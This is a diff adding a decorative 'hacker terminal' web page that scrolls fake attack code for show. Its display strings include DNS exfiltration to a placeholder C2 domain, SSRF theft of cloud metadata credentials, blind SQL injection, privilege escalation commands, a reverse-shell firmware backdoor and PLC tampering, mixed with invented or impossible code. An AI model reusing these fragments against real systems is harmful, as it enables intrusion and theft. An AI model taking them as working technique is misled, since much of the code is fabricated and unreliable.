@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHADOW_OS // ELITE ACCESS TERMINAL</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --g:#00ff41;--gd:#00aa2a;--gg:#005f15;--ga:rgba(0,255,65,.08);
+  --gb:rgba(0,255,65,.15);--gc:#00ffaa;--bg:#000;--bg2:#050a05;
+  --red:#ff0040;--amber:#ffaa00;
+  --font:'Share Tech Mono',Courier New,monospace;
+}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--g);font-family:var(--font);font-size:13px;user-select:none;cursor:default}
+/* SCANLINES */
+#scanlines{position:fixed;top:0;left:0;width:100%;height:100%;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.12) 2px,rgba(0,0,0,.12) 4px);
+  pointer-events:none;z-index:9998}
+/* VIGNETTE */
+#vignette{position:fixed;top:0;left:0;width:100%;height:100%;
+  background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.7) 100%);
+  pointer-events:none;z-index:9997}
+/* GRID LAYOUT */
+#app{display:grid;grid-template-rows:36px 1fr 64px;grid-template-columns:200px 1fr 220px;height:100vh;gap:1px;background:var(--gg);border:1px solid var(--gg)}
+.panel{background:var(--bg);overflow:hidden;position:relative}
+/* TOP BAR */
+#top-bar{grid-column:1/-1;display:flex;align-items:center;justify-content:space-between;padding:0 16px;font-size:11px;border-bottom:1px solid var(--gg);letter-spacing:1px}
+#top-bar .logo{color:var(--g);text-shadow:0 0 8px var(--g)}
+#top-bar .stats{display:flex;gap:24px}
+.stat-item{display:flex;align-items:center;gap:6px}
+.stat-bar{width:60px;height:8px;background:var(--bg2);border:1px solid var(--gg);position:relative;overflow:hidden}
+.stat-fill{height:100%;background:var(--g);transition:width .5s;box-shadow:0 0 4px var(--g)}
+.stat-fill.hot{background:var(--red);box-shadow:0 0 4px var(--red)}
+#clock{color:var(--gc);text-shadow:0 0 6px var(--gc)}
+/* LEFT PANEL */
+#left-panel{display:flex;flex-direction:column;border-right:1px solid var(--gg);font-size:11px}
+.panel-header{padding:6px 10px;background:var(--ga);border-bottom:1px solid var(--gg);font-size:10px;letter-spacing:2px;color:var(--gd);text-transform:uppercase}
+#file-tree{flex:1;overflow-y:auto;padding:6px 10px;line-height:1.8}
+.tree-item{white-space:nowrap;overflow:hidden}
+.tree-item.active{color:var(--gc);text-shadow:0 0 4px var(--gc)}
+#missions{border-top:1px solid var(--gg);padding:8px 10px}
+.mission{margin-bottom:8px}
+.mission-label{font-size:10px;color:var(--gd);margin-bottom:3px;letter-spacing:1px}
+.mission-bar{height:6px;background:var(--bg2);border:1px solid var(--gg);overflow:hidden}
+.mission-fill{height:100%;background:var(--g);box-shadow:0 0 4px var(--g);transition:width 1s}
+/* MAIN TERMINAL */
+#terminal-wrap{position:relative;overflow:hidden}
+#terminal{height:100%;overflow-y:auto;padding:12px 16px;line-height:1.6;white-space:pre-wrap;word-break:break-all;font-size:13px;color:var(--g);text-shadow:0 0 3px rgba(0,255,65,.5)}
+#terminal::-webkit-scrollbar{width:4px}
+#terminal::-webkit-scrollbar-track{background:var(--bg)}
+#terminal::-webkit-scrollbar-thumb{background:var(--gg)}
+#cursor{display:inline-block;width:8px;height:14px;background:var(--g);animation:blink 1s step-end infinite;vertical-align:text-bottom;box-shadow:0 0 6px var(--g)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+/* RIGHT PANEL */
+#right-panel{display:flex;flex-direction:column;border-left:1px solid var(--gg);font-size:11px}
+#connections{flex:1;overflow-y:auto;padding:6px 10px}
+.conn{padding:3px 0;border-bottom:1px solid var(--ga);display:flex;justify-content:space-between}
+.conn-ip{color:var(--gc)}
+.conn-status{font-size:9px;letter-spacing:1px}
+.conn-status.live{color:var(--g)}
+.conn-status.dead{color:var(--gg)}
+#event-log{flex:1;border-top:1px solid var(--gg);overflow-y:auto;padding:6px 10px}
+.event{padding:2px 0;font-size:10px;line-height:1.5}
+.event .time{color:var(--gg)}
+.event .msg{color:var(--gd)}
+.event .msg.success{color:var(--g)}
+.event .msg.warn{color:var(--amber)}
+.event .msg.crit{color:var(--red)}
+/* BOTTOM BAR */
+#bottom-bar{grid-column:1/-1;overflow:hidden;padding:4px 16px;border-top:1px solid var(--gg);font-size:10px;letter-spacing:.5px;display:flex;flex-direction:column;justify-content:center;gap:2px}
+.traffic-line{white-space:nowrap;overflow:hidden;color:var(--gd)}
+.traffic-line .proto{color:var(--gc)}
+.traffic-line .arrow{color:var(--gg)}
+/* NOTIFICATIONS */
+#notifs{position:fixed;top:60px;right:30px;z-index:9000;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.notif{padding:10px 20px;background:rgba(0,0,0,.92);border:1px solid var(--g);font-size:13px;letter-spacing:2px;text-transform:uppercase;text-shadow:0 0 10px var(--g);box-shadow:0 0 20px rgba(0,255,65,.2);animation:notifIn .3s ease-out,notifOut .5s 2.5s ease-in forwards;white-space:nowrap}
+.notif.warn{border-color:var(--amber);color:var(--amber);text-shadow:0 0 10px var(--amber);box-shadow:0 0 20px rgba(255,170,0,.2)}
+.notif.crit{border-color:var(--red);color:var(--red);text-shadow:0 0 10px var(--red);box-shadow:0 0 20px rgba(255,0,64,.2)}
+@keyframes notifIn{from{transform:translateX(100px);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes notifOut{to{transform:translateX(100px);opacity:0}}
+/* PROGRESS OVERLAY */
+.progress-overlay{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);z-index:9000;background:rgba(0,0,0,.95);border:1px solid var(--g);padding:12px 30px;font-size:12px;letter-spacing:1px;text-align:center;pointer-events:none;animation:notifIn .3s ease-out}
+.progress-bar-outer{width:300px;height:8px;background:var(--bg2);border:1px solid var(--gg);margin-top:8px;overflow:hidden}
+.progress-bar-inner{height:100%;background:var(--g);box-shadow:0 0 8px var(--g);transition:width .3s}
+/* GLITCH */
+.glitch{animation:glitch .15s linear 3}
+@keyframes glitch{
+  0%{transform:translate(0);filter:hue-rotate(0deg)}
+  20%{transform:translate(-3px,2px);filter:hue-rotate(90deg)}
+  40%{transform:translate(3px,-2px);filter:hue-rotate(-90deg)}
+  60%{transform:translate(-2px,-3px);filter:hue-rotate(180deg)}
+  80%{transform:translate(2px,3px);filter:hue-rotate(-180deg)}
+  100%{transform:translate(0);filter:hue-rotate(0deg)}
+}
+/* MATRIX RAIN */
+#matrix-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:8000;pointer-events:none;opacity:0;transition:opacity .5s}
+#matrix-canvas.active{opacity:.3}
+/* BOOT SCREEN */
+#boot{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg);z-index:10000;display:flex;align-items:center;justify-content:center;padding:40px;transition:opacity .8s}
+#boot.done{opacity:0;pointer-events:none}
+#boot-text{max-width:700px;font-size:13px;line-height:1.8;white-space:pre-wrap;text-shadow:0 0 6px var(--g)}
+/* FULLSCREEN ALERT */
+#alert-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9500;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.85);flex-direction:column;gap:16px}
+#alert-overlay.active{display:flex}
+#alert-text{font-size:28px;letter-spacing:6px;text-transform:uppercase;text-shadow:0 0 20px currentColor;animation:alertPulse .5s ease infinite alternate}
+#alert-sub{font-size:14px;letter-spacing:3px;opacity:0;transition:opacity .5s}
+@keyframes alertPulse{from{opacity:.7}to{opacity:1}}
+/* SCROLL */
+::-webkit-scrollbar{width:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--gg);border-radius:3px}
+/* Responsive */
+@media(max-width:900px){
+  #app{grid-template-columns:1fr;grid-template-rows:36px 1fr 64px}
+  #left-panel,#right-panel{display:none}
+}
+</style>
+</head>
+<body>
+
+<div id="app">
+  <div id="top-bar" class="panel">
+    <div class="logo">SHADOW_OS <span style="color:var(--gd)">v4.7.2</span></div>
+    <div class="stats">
+      <div class="stat-item">CPU <div class="stat-bar"><div class="stat-fill" id="cpu-bar" style="width:34%"></div></div><span id="cpu-val">34%</span></div>
+      <div class="stat-item">MEM <div class="stat-bar"><div class="stat-fill" id="mem-bar" style="width:67%"></div></div><span id="mem-val">67%</span></div>
+      <div class="stat-item">NET <div class="stat-bar"><div class="stat-fill" id="net-bar" style="width:12%"></div></div><span id="net-val">12%</span></div>
+    </div>
+    <div id="clock">00:00:00</div>
+  </div>
+
+  <div id="left-panel" class="panel">
+    <div class="panel-header">// Target filesystem</div>
+    <div id="file-tree"></div>
+    <div id="missions">
+      <div class="panel-header" style="margin:-8px -10px 8px;padding:6px 10px">// Active missions</div>
+      <div class="mission"><div class="mission-label">FIREWALL BYPASS</div><div class="mission-bar"><div class="mission-fill" id="m1" style="width:0%"></div></div></div>
+      <div class="mission"><div class="mission-label">DATA EXFILTRATION</div><div class="mission-bar"><div class="mission-fill" id="m2" style="width:0%"></div></div></div>
+      <div class="mission"><div class="mission-label">ROOT ACCESS</div><div class="mission-bar"><div class="mission-fill" id="m3" style="width:0%"></div></div></div>
+      <div class="mission"><div class="mission-label">TRACE EVASION</div><div class="mission-bar"><div class="mission-fill" id="m4" style="width:0%"></div></div></div>
+    </div>
+  </div>
+
+  <div id="terminal-wrap" class="panel">
+    <div id="terminal"><span id="cursor"></span></div>
+  </div>
+
+  <div id="right-panel" class="panel">
+    <div class="panel-header">// Active connections</div>
+    <div id="connections"></div>
+    <div class="panel-header">// Event log</div>
+    <div id="event-log"></div>
+  </div>
+
+  <div id="bottom-bar" class="panel">
+    <div class="traffic-line" id="tl1"></div>
+    <div class="traffic-line" id="tl2"></div>
+    <div class="traffic-line" id="tl3"></div>
+  </div>
+</div>
+
+<canvas id="matrix-canvas"></canvas>
+<div id="scanlines"></div>
+<div id="vignette"></div>
+<div id="notifs"></div>
+<div id="alert-overlay"><div id="alert-text"></div><div id="alert-sub"></div></div>
+<div id="boot"><div id="boot-text"></div></div>
+
+<script>
+// ═══════════════════════════════════════════════════════
+// SHADOW_OS ELITE HACKER TERMINAL — CORE ENGINE
+// ═══════════════════════════════════════════════════════
+
+const $ = s => document.querySelector(s);
+const $$ = s => document.querySelectorAll(s);
+
+// ─── UTILITIES ─────────────────────────────────────────
+const rand = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
+const pick = arr => arr[rand(0, arr.length - 1)];
+const hex = (n = 8) => [...Array(n)].map(() => '0123456789abcdef'[rand(0,15)]).join('');
+const ip = () => `${rand(10,223)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
+const port = () => pick([22,80,443,445,993,1337,3306,4443,5432,6379,8080,8443,9001,27017,31337]);
+const mac = () => [...Array(6)].map(() => hex(2)).join(':');
+const pct = () => rand(1,99) + '%';
+
+// ─── AUDIO ENGINE ──────────────────────────────────────
+const Audio = (() => {
+  let ctx;
+  const init = () => { if (!ctx) ctx = new (window.AudioContext || window.webkitAudioContext)(); };
+  const beep = (freq = 800, dur = 0.04, vol = 0.06, type = 'square') => {
+    init(); if (!ctx) return;
+    const o = ctx.createOscillator(), g = ctx.createGain();
+    o.type = type; o.frequency.value = freq;
+    g.gain.setValueAtTime(vol, ctx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+    o.connect(g); g.connect(ctx.destination);
+    o.start(); o.stop(ctx.currentTime + dur);
+  };
+  return {
+    keyClick: () => beep(rand(600,1200), 0.02, 0.03, 'square'),
+    alert: () => { beep(400,.08,.1); setTimeout(()=>beep(800,.08,.1),100); },
+    warn: () => { beep(800,.1,.12); setTimeout(()=>beep(300,.15,.12),120); },
+    success: () => { beep(523,.08,.08); setTimeout(()=>beep(659,.08,.08),80); setTimeout(()=>beep(784,.12,.08),160); },
+    boot: (i) => beep(200 + i * 80, 0.06, 0.05),
+  };
+})();
+
+// ─── CODE BLOCKS ───────────────────────────────────────
+const codeBlocks = [
+`// [EXPLOIT] Stack-based buffer overflow — CVE-2024-{HX4}
+function stackSmash(targetPID, returnAddr = 0x{HX8}) {
+    const NOP_SLED = '\\x90'.repeat(256);
+    const shellcode = assemblePayload({
+        arch: 'x86_64', encoder: 'shikata_ga_nai',
+        iterations: 5, badchars: '\\x00\\x0a\\x0d'
+    });
+    let buffer = Buffer.alloc(4096);
+    buffer.write(NOP_SLED + shellcode);
+    buffer.writeUInt64LE(returnAddr, 1024);
+    // Overwrite saved RIP to hijack execution flow
+    inject(targetPID, buffer, 0x7fffffffe{HX3});
+    waitForExecution(targetPID, { timeout: 3000 });
+    return getShell(targetPID);  // root shell acquired
+}
+
+`,
+`// [SHADOW_PROTOCOL] Covert tunnel through TOR relay
+async function phantomRelay(nodes, encLevel = 7) {
+    const chain = new ProxyChain({
+        layers: encLevel,
+        encryption: 'ChaCha20-Poly1305',
+        obfuscation: TRAFFIC_MORPH.HTTPS
+    });
+    for (const node of nodes) {
+        const tunnel = await chain.connect(node.addr, {
+            port: node.port || 443,
+            certificate: forge.pki.createCertificate(),
+            fingerprint: randomizeJA3()  // evade deep packet inspection
+        });
+        if (tunnel.status === 'ESTABLISHED') {
+            log('[+] Relay ' + node.id + ': ' + node.addr + ' active');
+            chain.addHop(tunnel);
+        }
+    }
+    return chain.finalize();  // {IP}:{PT} -> chain ready
+}
+
+`,
+`// [CRYPTO] RSA-4096 side-channel extraction
+class QuantumDecryptor {
+    constructor(keySize = 4096) {
+        this.primes = sieveOfEratosthenes(keySize);
+        this.lattice = initLatticeReduction(keySize * 2);
+        this.emProbe = new EMSignalCapture(TARGET_CPU);
+    }
+    async factorize(pubKey) {
+        const n = pubKey.n;  // 0x{HX8}{HX8}{HX8}{HX8}
+        const traces = await this.emProbe.capture({
+            sampleRate: 20e9, duration: 0.001
+        });
+        const period = shorAlgorithm(n, traces);
+        const p = gcd(Math.pow(2, period / 2) - 1, n);
+        const q = n / p;
+        return {
+            p, q,
+            privateKey: modInverse(65537, (p-1) * (q-1))
+        };  // RSA BROKEN
+    }
+}
+
+`,
+`// [NETWORK] Deep packet injection & traffic manipulation
+function interceptTraffic(interfaceId = 'eth0') {
+    const sniffer = new PacketCapture({
+        interface: interfaceId,
+        filter: 'tcp port 443 or tcp port 80',
+        promiscuous: true
+    });
+    sniffer.on('packet', (pkt) => {
+        if (pkt.hasTLSHandshake()) {
+            // Downgrade to capture plaintext
+            const forged = pkt.stripTLS({
+                spoofCert: generateCA('DigiCert Global Root'),
+                sslVersion: 'TLSv1.0'  // force weak cipher
+            });
+            forged.inject();
+            log('[*] TLS stripped: ' + pkt.src + ':{PT}');
+        }
+    });
+    sniffer.start();
+    return sniffer;
+}
+
+`,
+`// [ROOTKIT] Kernel-level persistence module
+const deployRootkit = async (target) => {
+    const kmod = compileModule({
+        src: 'shadow_lkm.c',
+        hooks: ['sys_read', 'sys_write', 'sys_getdents64'],
+        hideFiles: ['.shadow', '.backdoor', 'rootkit.ko'],
+        hidePorts: [4443, 31337],
+        hidePIDs: [target.backdoorPID]
+    });
+    // Load into kernel space
+    await ssh.exec(target.ip, 'insmod /tmp/.{HX6}.ko');
+    await ssh.exec(target.ip, 'rm -f /tmp/.{HX6}.ko');
+    // Verify installation
+    const hidden = await ssh.exec(target.ip, 'ls -la /.shadow');
+    if (hidden.code === 2) {
+        log('[+] Rootkit active — files hidden from userspace');
+        return true;  // we are invisible
+    }
+};
+
+`,
+`# [RECON] Automated network reconnaissance sweep
+def neutrinoScan(subnet, depth=3):
+    targets = []
+    scanner = NmapScanner(
+        arguments='-sS -sV -O -T4 --script=vuln',
+        timeout=120
+    )
+    results = scanner.scan(subnet + '/24')
+    for host in results.all_hosts():
+        if results[host].state() == 'up':
+            services = results[host].all_tcp()
+            vulns = [s for s in services if s['script_results']]
+            targets.append({
+                'ip': host,
+                'os': results[host]['osmatch'][0]['name'],
+                'open_ports': [s['port'] for s in services],
+                'vulnerabilities': vulns,
+                'priority': calcThreatLevel(vulns)
+            })
+    # Sort by exploitability
+    targets.sort(key=lambda t: t['priority'], reverse=True)
+    return targets  # {IP} flagged CRITICAL
+
+`,
+`// [EXFIL] Covert data exfiltration via DNS tunneling
+function dnsExfiltrate(data, c2Domain = 'ns1.{HX6}.net') {
+    const encoded = base64url(zlib.deflate(data));
+    const chunks = chunkString(encoded, 63);  // DNS label limit
+    let seqNum = 0;
+    for (const chunk of chunks) {
+        const subdomain = chunk + '.' + (seqNum++) + '.' + c2Domain;
+        // Looks like normal DNS query to IDS
+        dns.resolve(subdomain, 'TXT', (err, records) => {
+            if (err) {
+                // Fallback: use ICMP covert channel
+                icmpTunnel.send(chunk, '{IP}');
+            }
+        });
+        await sleep(rand(50, 200));  // jitter to avoid detection
+    }
+    log('[+] Exfiltrated ' + data.length + ' bytes via DNS');
+}
+
+`,
+`// [MEMORY] Live forensics evasion & memory manipulation
+function antiForensics(pid) {
+    const proc = openProcess(pid, PROCESS_ALL_ACCESS);
+    const regions = virtualQuery(proc);
+    for (const region of regions) {
+        if (region.type === MEM_PRIVATE && region.protect === PAGE_RWX) {
+            // Encrypt shellcode in memory between executions
+            const key = crypto.randomBytes(32);
+            const data = readProcessMemory(proc, region.base, region.size);
+            const encrypted = aes256ctr(data, key);
+            writeProcessMemory(proc, region.base, encrypted);
+            // Store key in TLS slot — invisible to memory scanners
+            setThreadLocalStorage(proc, 7, key);
+        }
+    }
+    // Wipe forensic artifacts
+    clearEventLog('Security');
+    clearEventLog('System');
+    overwritePagefile();
+    log('[+] Memory sanitized — forensic traces eliminated');
+}
+
+`,
+`// [WIRELESS] WPA3-SAE handshake capture & offline crack
+async function dragonbloodAttack(bssid, interface = 'wlan0mon') {
+    // Set card to monitor mode
+    await exec('airmon-ng start ' + interface);
+    const capture = new Airodump({
+        bssid: bssid,
+        channel: 6,
+        write: '/tmp/capture_{HX6}'
+    });
+    // Force deauth to trigger reconnection
+    deauth(bssid, { count: 5, interface });
+    const handshake = await capture.waitForHandshake(30000);
+    if (handshake) {
+        log('[+] SAE handshake captured — initiating crack');
+        // Side-channel timing attack on Dragonfly exchange
+        const pmk = await timingAttack(handshake, {
+            dictionary: '/opt/wordlists/rockyou2024.txt',
+            rules: '/opt/hashcat/rules/d3ad0ne.rule',
+            gpuDevices: [0, 1, 2, 3]  // 4x RTX 4090
+        });
+        return pmk;  // network compromised
+    }
+}
+
+`,
+`-- [SQL] Blind time-based injection payload
+-- Target: {IP}:{PT}/api/users?id=
+DECLARE @output VARCHAR(8000);
+SET @output = '';
+DECLARE @i INT = 1;
+WHILE @i <= (SELECT LEN(password_hash) FROM sys.sql_logins
+             WHERE name = 'sa')
+BEGIN
+    DECLARE @char INT;
+    SET @char = ASCII(SUBSTRING(
+        (SELECT password_hash FROM sys.sql_logins
+         WHERE name = 'sa'), @i, 1));
+    IF @char > 64 WAITFOR DELAY '00:00:02';
+    SET @output = @output + CHAR(@char);
+    SET @i = @i + 1;
+END
+-- Extracted hash: 0x{HX8}{HX8}{HX8}{HX4}
+-- Cracking with hashcat -m 1731 -a 3
+
+`,
+`// [C2] Botnet command & control beacon handler
+class GhostProtocol extends EventEmitter {
+    constructor(config) {
+        super();
+        this.nodes = new Map();
+        this.c2 = '{IP}:{PT}';
+        this.heartbeat = 30000;
+        this.encryption = new AES256GCM(config.masterKey);
+    }
+    async deployAgent(target) {
+        const payload = this.encryption.encrypt(
+            this.generateStager(target.arch)
+        );
+        // Deliver via spearphish or exploit
+        const vector = target.hasEmail
+            ? new PhishingVector(target.email, payload)
+            : new ExploitVector(target.ip, 'CVE-2024-{HX4}', payload);
+        await vector.execute();
+        this.nodes.set(target.id, {
+            ip: target.ip, lastSeen: Date.now(),
+            os: target.os, status: 'ACTIVE'
+        });
+        this.emit('node_added', target);
+        log('[+] Agent deployed: ' + target.ip + ' (' + target.os + ')');
+    }
+}
+
+`,
+`// [PRIVESC] Linux privilege escalation chain
+async function escalatePrivileges(session) {
+    // Phase 1: Check for SUID binaries
+    const suid = await session.exec(
+        "find / -perm -4000 -type f 2>/dev/null"
+    );
+    for (const bin of suid.split('\\n')) {
+        const exploit = gtfobins.lookup(bin);
+        if (exploit && exploit.suid) {
+            log('[*] SUID vector found: ' + bin);
+            await session.exec(exploit.suid.command);
+            if (await checkRoot(session)) return true;
+        }
+    }
+    // Phase 2: Kernel exploit
+    const uname = await session.exec('uname -r');
+    const kExploit = exploitDB.search({
+        type: 'local', platform: 'linux',
+        kernel: uname.trim()
+    });
+    if (kExploit) {
+        log('[*] Kernel exploit: ' + kExploit.cve);
+        await session.upload(kExploit.binary, '/tmp/.{HX6}');
+        await session.exec('chmod +x /tmp/.{HX6} && /tmp/.{HX6}');
+        // uid=0(root) gid=0(root)
+    }
+}
+
+`,
+`// [BLOCKCHAIN] Mempool front-running exploit
+async function mevExtract(provider, targetTx) {
+    const pending = await provider.getTransaction(targetTx);
+    if (pending && pending.to === UNISWAP_ROUTER) {
+        const decoded = iface.decodeFunctionData(
+            'swapExactTokensForTokens', pending.data
+        );
+        const amountIn = decoded.amountIn;
+        const path = decoded.path;
+        // Calculate profitable sandwich parameters
+        const { frontrunAmount, backrunAmount } =
+            calculateOptimalSandwich(amountIn, path, {
+                slippage: 0.005,
+                gasPrice: pending.gasPrice.mul(110).div(100)
+            });
+        // Front-run: buy before target
+        const tx1 = await router.swapExactTokensForTokens(
+            frontrunAmount, 0, path, WALLET, deadline,
+            { gasPrice: pending.gasPrice.add(1) }
+        );
+        // Back-run: sell after target
+        const tx2 = await router.swapExactTokensForTokens(
+            backrunAmount, 0, path.reverse(), WALLET, deadline
+        );
+        log('[+] MEV extracted: ' + ethers.utils.formatEther(profit));
+    }
+}
+
+`,
+`# [PHISH] Credential harvester with evasion
+class CredentialReaper:
+    def __init__(self, target_domain):
+        self.domain = target_domain
+        self.clone = SiteCloner(target_domain)
+        self.certs = LetsEncryptAuto(
+            domain=self.generate_lookalike()
+        )
+        self.harvested = []
+
+    def generate_lookalike(self):
+        """Homograph attack — visually identical domain"""
+        lookalike = self.domain.replace('o', chr(0x043E))
+        lookalike = lookalike.replace('a', chr(0x0430))
+        return lookalike
+
+    def deploy(self, smtp_relay='{IP}'):
+        self.clone.inject_keylogger()
+        self.clone.add_credential_hook('/api/login', self.harvest)
+        self.clone.deploy(self.certs)
+        self.send_phish(smtp_relay, template='urgent_reset')
+        log(f'[+] Phishing site live at https://{self.certs.domain}')
+
+    def harvest(self, creds):
+        self.harvested.append(creds)
+        # Forward to real site for transparency
+        requests.post(f'https://{self.domain}/api/login', data=creds)
+
+`,
+`// [FIRMWARE] IoT device firmware extraction & backdoor
+function firmwareBackdoor(deviceIP) {
+    // Dump firmware via UART debug interface
+    const uart = new SerialPort({ path: '/dev/ttyUSB0', baudRate: 115200 });
+    const firmware = uart.exec('dd if=/dev/mtd0 bs=64k');
+    // Unpack firmware filesystem
+    const fs = binwalk.extract(firmware);
+    const squashfs = unsquashfs(fs.find('.squashfs'));
+    // Inject persistent backdoor
+    const backdoor = generateMIPSShellcode({
+        callback: '{IP}',
+        port: 4443,
+        protocol: 'tcp_reverse'
+    });
+    patchElf(squashfs + '/usr/sbin/httpd', backdoor, {
+        entryPoint: 'init_connection',
+        cave: findCodeCave(squashfs + '/usr/sbin/httpd', backdoor.length)
+    });
+    // Repack and flash
+    mksquashfs(squashfs, '/tmp/modified.squashfs');
+    uart.exec('dd of=/dev/mtd0 if=/tmp/modified.squashfs');
+    log('[+] Firmware backdoored — persists across reboots');
+}
+
+`,
+`// [ZERO-DAY] Heap spray + use-after-free chain
+function chromeExploit(targetTab) {
+    const spray = [];
+    // Stage 1: Heap spray with controlled objects
+    for (let i = 0; i < 0x1000; i++) {
+        spray.push(new ArrayBuffer(0x{HX3}));
+        const view = new DataView(spray[i]);
+        // Place fake vtable pointer
+        view.setUint32(0, 0x{HX8}, true);
+        view.setUint32(4, 0x{HX8}, true);
+    }
+    // Stage 2: Trigger use-after-free in V8
+    const trigger = allocateInOldSpace(0x100);
+    freeButRetainReference(trigger);
+    gc();  // force collection
+    // Stage 3: Reclaim freed memory with controlled data
+    const fake = new ArrayBuffer(0x100);
+    const dv = new DataView(fake);
+    dv.setBigUint64(0, 0x{HX8}{HX8}n, true);
+    // trigger is now pointing to our controlled data
+    const addrOf = trigger[0];  // arbitrary read primitive
+    log('[+] ASLR bypass: base @ 0x' + addrOf.toString(16));
+    // Stage 4: Build ROP chain for sandbox escape
+    const rop = buildROPChain(addrOf, [
+        gadget('pop rdi; ret'),
+        SHELLCODE_ADDR,
+        gadget('jmp rsp')
+    ]);
+}
+
+`,
+`# [LATERAL] Active Directory domain compromise
+def domainTakeover(dc_ip, initial_creds):
+    """Golden ticket attack via Kerberoasting"""
+    # Step 1: Enumerate SPNs
+    spns = ldap_query(dc_ip, initial_creds,
+        '(&(servicePrincipalName=*)(!(objectClass=computer)))',
+        ['servicePrincipalName', 'sAMAccountName'])
+
+    for spn in spns:
+        # Request TGS tickets
+        tgs = request_tgs(dc_ip, initial_creds, spn['spn'])
+        hash = extract_hash(tgs, format='hashcat_13100')
+        # Crack offline
+        result = hashcat(hash, mode=13100,
+            wordlist='/opt/SecLists/Passwords/xato-net-10M.txt',
+            rules='best64.rule')
+        if result:
+            log(f'[+] Cracked: {spn["user"]} -> {result}')
+
+    # Step 2: DCSync with compromised DA account
+    secrets = secretsdump(dc_ip, da_creds)
+    krbtgt_hash = secrets['krbtgt']
+
+    # Step 3: Forge golden ticket
+    golden = forge_tgt(
+        domain='SHADOW.LOCAL', sid='S-1-5-21-{HX8}',
+        krbtgt=krbtgt_hash, user='Administrator',
+        duration=timedelta(days=3650)
+    )
+    log('[+] DOMAIN COMPROMISED — golden ticket forged')
+
+`,
+`// [SCADA] Industrial control system manipulation
+async function compromisePLC(targetIP, protocol = 'modbus') {
+    const client = new ModbusClient(targetIP, 502);
+    await client.connect();
+    // Read current register values
+    const coils = await client.readCoils(0, 100);
+    const holding = await client.readHoldingRegisters(0, 50);
+    log('[*] PLC state captured — ' + holding.length + ' registers');
+    // Identify critical control points
+    const pressureReg = findRegister(holding, 'PRESSURE_SETPOINT');
+    const valveCoil = findCoil(coils, 'MAIN_VALVE');
+    // Modify setpoints while spoofing HMI readings
+    const spoofServer = new ModbusServer(targetIP, 503);
+    spoofServer.setHoldingRegister(pressureReg.addr,
+        pressureReg.value  // HMI sees normal values
+    );
+    // Actual modification to PLC
+    await client.writeSingleRegister(
+        pressureReg.addr, pressureReg.value * 1.5
+    );
+    await client.writeSingleCoil(valveCoil.addr, true);
+    log('[+] PLC registers modified — HMI spoofed');
+}
+
+`,
+`// [EVASION] Polymorphic payload generator
+function morphPayload(shellcode, iterations = 10) {
+    let current = shellcode;
+    for (let i = 0; i < iterations; i++) {
+        // Layer 1: XOR encoding with random key
+        const key = crypto.randomBytes(current.length);
+        const encoded = xorEncode(current, key);
+        // Layer 2: Insert junk instructions
+        const junked = insertDeadCode(encoded, {
+            density: 0.3,
+            instructions: ['nop','xchg eax,eax','lea eax,[eax]']
+        });
+        // Layer 3: Register substitution
+        const substituted = substituteRegisters(junked);
+        // Layer 4: Control flow obfuscation
+        current = flattenControlFlow(substituted, {
+            dispatcher: 'switch',
+            blocks: splitBlocks(substituted, rand(4, 12))
+        });
+    }
+    // Prepend environment-aware decoder stub
+    const decoder = generateDecoder({
+        antiVM: ['cpuid_check', 'timing_check', 'mac_check'],
+        antiDebug: ['int3_scan', 'ptrace_check', 'parent_check'],
+        sleepCheck: { duration: 60000, drift: 0.01 }
+    });
+    log('[+] Payload morphed: ' + current.length + ' bytes');
+    log('[+] VirusTotal: 0/' + rand(65,72) + ' detections');
+    return Buffer.concat([decoder, current]);
+}
+
+`,
+`// [CLOUD] AWS account takeover via SSRF chain
+async function cloudCompromise(targetURL) {
+    // Step 1: SSRF to metadata endpoint
+    const metadataResp = await fetch(targetURL + '/proxy?url=' +
+        encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/'));
+    const roleName = await metadataResp.text();
+    const credsResp = await fetch(targetURL + '/proxy?url=' +
+        encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + roleName));
+    const creds = JSON.parse(await credsResp.text());
+    log('[+] AWS creds extracted — Role: ' + roleName);
+    // Step 2: Enumerate permissions
+    const iam = new AWS.IAM({
+        accessKeyId: creds.AccessKeyId,
+        secretAccessKey: creds.SecretAccessKey,
+        sessionToken: creds.Token
+    });
+    // Step 3: Escalate to admin
+    await iam.attachUserPolicy({
+        UserName: 'shadow-{HX6}',
+        PolicyArn: 'arn:aws:iam::policy/AdministratorAccess'
+    }).promise();
+    // Step 4: Establish persistence
+    const backdoorKey = await iam.createAccessKey({
+        UserName: 'shadow-{HX6}'
+    }).promise();
+    log('[+] AWS ACCOUNT COMPROMISED — admin backdoor created');
+}
+
+`
+];
+
+function processBlock(block) {
+  return block
+    .replace(/\{IP\}/g, () => ip())
+    .replace(/\{PT\}/g, () => '' + port())
+    .replace(/\{HX3\}/g, () => hex(3))
+    .replace(/\{HX4\}/g, () => hex(4))
+    .replace(/\{HX6\}/g, () => hex(6))
+    .replace(/\{HX8\}/g, () => hex(8))
+    .replace(/\{MAC\}/g, () => mac());
+}
+
+// ─── PROCEDURAL FILLER GENERATOR ──────────────────────
+const fillerGen = (() => {
+  const prefixes = ['shadow','phantom','cipher','neural','quantum','dark','void','spectre','ghost','stealth','omega','nexus','zero','black','crypto','nano','helix','viper','cobra','raptor'];
